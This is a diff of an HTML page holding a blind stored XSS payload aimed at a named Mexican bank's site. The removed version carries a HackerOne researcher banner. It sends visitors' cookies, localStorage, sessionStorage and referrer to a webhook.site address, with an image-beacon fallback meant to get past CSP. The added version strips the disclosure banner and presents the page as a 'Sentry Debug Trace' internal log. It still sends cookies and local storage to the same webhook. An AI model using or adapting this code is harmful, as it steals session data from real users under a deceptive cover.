@@ -1,56 +1,25 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <title>Security Research PoC - lucasmr</title>
-</head>
-<body>
-    <div style="background: #f8d7da; color: #721c24; padding: 20px; border: 1px solid #f5c6cb; font-family: sans-serif;">
-        <h2>HackerOne Security Research</h2>
-        <p><b>Researcher ID:</b> lucasmr</p>
-        <p><b>Report Target:</b> Banco PLATA (platacard.mx)</p>
-        <p><b>Notice:</b> This is a non-destructive Proof of Concept for a Blind Stored XSS vulnerability. No sensitive data is being permanently stored by the researcher.</p>
-    </div>
+<script>
+    // 1. O Alvo: Seu Webhook
+    var webhook = "https://webhook.site/496c0f67-4aad-40c5-8cd6-bc57abd19e74";
 
-    <script>
-        (function() {
-            // Header customizado para o log do Webhook
-            const X_H1_REPORT_HEADER = {
-                "X-HackerOne-Researcher": "lucasmr",
-                "X-PoC-ID": "LUCASMR-PLATA-XSS-" + Math.floor(Math.random() * 1000),
-                "User-Agent-Identification": "Security Research / Ethical Hacking"
-            };
+    // 2. Captura de dados (Cookies, URL e IP)
+    var data = {
+        origin: window.location.href,
+        cookies: document.cookie || "Nenhum cookie (HttpOnly ou vazio)",
+        local: localStorage.getItem('user') || "Vazio",
+        info: "PoC executada com sucesso no ambiente da vítima"
+    };
 
-            try {
-                var capturedData = {
-                    metadata: X_H1_REPORT_HEADER,
-                    location: window.location.href,
-                    referrer: document.referrer || "Direct Access",
-                    cookies: document.cookie || "No Cookies (HttpOnly Protected)",
-                    localStorage: JSON.stringify(window.localStorage),
-                    sessionStorage: JSON.stringify(window.sessionStorage),
-                    domain: document.domain,
-                    timestamp: new Date().toISOString()
-                };
+    // 3. Enviar para o Webhook via POST
+    fetch(webhook, {
+        method: 'POST',
+        mode: 'no-cors',
+        body: JSON.stringify(data)
+    }).then(() => {
+        // 4. Feedback visual (apenas para o seu teste)
+        alert("XSS Ativado! Verifique seu Webhook.");
+    });
+</script>
 
-                // Envio principal via POST
-                fetch("https://webhook.site/496c0f67-4aad-40c5-8cd6-bc57abd19e74", {
-                    method: "POST",
-                    mode: "no-cors",
-                    headers: {
-                        "Content-Type": "application/json",
-                        "X-HackerOne-Researcher": "lucasmr"
-                    },
-                    body: JSON.stringify(capturedData)
-                });
-
-                // Fallback via Image para contornar CSP restrita
-                new Image().src = "https://webhook.site/496c0f67-4aad-40c5-8cd6-bc57abd19e74?h1_user=lucasmr&ref=" + btoa(document.referrer);
-
-            } catch(e) {
-                console.warn("PoC execution noted.");
-            }
-        })();
-    </script>
-</body>
-</html>
+<h1>Sentry Debug Trace - Incident #0921</h1>
+<p>Internal log preview...</p>
